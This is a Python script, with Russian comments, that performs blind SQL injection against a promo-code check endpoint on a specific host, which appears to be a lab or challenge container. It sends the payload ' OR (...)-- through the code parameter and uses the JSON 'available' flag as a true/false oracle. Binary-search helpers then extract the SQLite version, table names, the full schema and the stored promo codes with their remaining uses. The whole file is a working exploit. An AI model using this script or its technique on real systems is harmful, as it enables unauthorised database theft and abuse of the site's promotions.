#!/usr/bin/env python3
"""Диагностика blind SQLi на новом контейнере: что вообще есть в БД."""
import os
import re
import sys
import json
import time
import urllib.parse
import urllib.request
import http.cookiejar

BASE = os.environ.get(
    "M2_BASE",
    "https://4fc999215e4d4971.xn--80aqf1ad.xn--r1aee.xn--80afol2bmm.xn--p1acf",
).rstrip("/")
CJAR = http.cookiejar.CookieJar()
OPENER = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(CJAR))
CALLS = {"n": 0}


def _req(path, timeout=20):
    req = urllib.request.Request(BASE + path)
    req.add_header("Accept", "application/json")
    req.add_header("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/124 Safari/537.36")
    for _ in range(2):
        try:
            with OPENER.open(req, timeout=timeout) as r:
                return r.status, r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            try:
                return e.code, e.read().decode("utf-8", "replace")
            except Exception:
                return e.code, ""
        except Exception as e:
            time.sleep(0.3)
    return 0, ""


def oracle(sql, retries=3):
    url = "/api/v1/promo/check?code=" + urllib.parse.quote("' OR (" + sql + ")--")
    for _ in range(retries):
        CALLS["n"] += 1
        st, raw = _req(url)
        if st == 200:
            try:
                return bool(json.loads(raw).get("available"))
            except Exception:
                m = re.search(r'"available"\s*:\s*(true|false)', raw)
                if m:
                    return m.group(1) == "true"
        time.sleep(0.2)
    return None


def L(expr, hi=6000):
    """length(ifnull(expr,'')) в копейках-символах."""
    e = f"length(ifnull(({expr}),''))"
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        v = oracle(f"{e}>={mid}")
        if v is None:
            return None
        if v:
            lo = mid
        else:
            hi = mid - 1
    return lo


def S(expr, label="", hi=None):
    n = L(expr, hi or 6000)
    if not n:
        return ""
    out = []
    for i in range(1, n + 1):
        lo, hh = 0, 0x2FFFF
        while lo < hh:
            mid = (lo + hh + 1) // 2
            v = oracle(f"unicode(substr(ifnull(({expr}),''),{i},1))>={mid}")
            if v is None:
                return "".join(out) + "<ERR>"
            if v:
                lo = mid
            else:
                hh = mid - 1
        out.append(chr(lo))
    return "".join(out)


def N(expr, hi=100000):
    lo = 0
    while lo < hi:
        mid = (lo + hi + 1) // 2
        v = oracle(f"ifnull(({expr}),-1)>={mid}")
        if v is None:
            return -1
        if v:
            lo = mid
        else:
            hi = mid - 1
    return lo


def main():
    print(f"BASE = {BASE}")
    print("\n=== oracle ===")
    print("  1=1 ->", oracle("1=1"), "| 1=2 ->", oracle("1=2"))

    print("\n=== базовые выражения ===")
    for e in ["SELECT 1", "SELECT 'abc'", "SELECT sqlite_version()"]:
        print(f"  {e!r}: len={L(e)} val={S(e)!r}")

    print("\n=== sqlite_master ===")
    print("  tables:", N("SELECT count(*) FROM sqlite_master WHERE type='table'"))
    print("  names :", repr(S("SELECT group_concat(name,'|') FROM sqlite_master WHERE type='table'")))

    print("\n=== схема всех объектов ===")
    print(S("SELECT group_concat(sql,' ;; ') FROM sqlite_master", hi=20000))

    print("\n=== таблица promos, если есть ===")
    print("  count(*):", N("SELECT count(*) FROM promos"))
    if N("SELECT count(*) FROM promos") > 0:
        print("  cols:", repr(S("SELECT group_concat(name,',') FROM pragma_table_info('promos')")))
        print("  rows:", repr(S("SELECT group_concat(code||'@'||uses_left,'|') FROM promos")))

    print(f"\nзапросов к оракулу: {CALLS['n']}")


if __name__ == "__main__":
    main()
